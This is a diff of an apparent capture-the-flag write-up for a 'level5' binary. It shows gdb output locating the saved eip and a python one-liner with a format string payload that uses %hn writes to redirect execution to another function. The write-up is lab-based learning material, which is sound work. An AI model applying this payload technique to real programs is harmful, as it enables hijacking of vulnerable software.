@@ -17,7 +17,8 @@ AAAA0x41414141
 then we need the printf's return address 
 
 so with gdb we run the exec with some random param.
-when the printf is call we make an info frame to see the saved registers:
+when the printf is call we make an info frame to see the saved registers,
+the goal is to overwrite the eip registers with the 'o' function call
 
 (gdb) info frame
 Stack level 0, frame at 0xbffff500:
@@ -28,6 +29,8 @@ Stack level 0, frame at 0xbffff500:
  Saved registers:
   eip at 0xbffff4fc
 
-the printf call address is 0x80484a4
+the eip is at 0xbffff4fc, so we have our exploit.
+the address we need to put is 0x080484a4, and we split it in two with the %hn
+modifier:
 
-exploit : (python -c 'print "\xfc\xf4\xff\xbf%134513824x"+"%4$n"';cat) | ./level5
+(python -c 'print "\xfc\xf4\xff\xbf\xfe\xf4\xff\xbf%33948x%4$n%33632x%5$n"'; cat) | ./level5
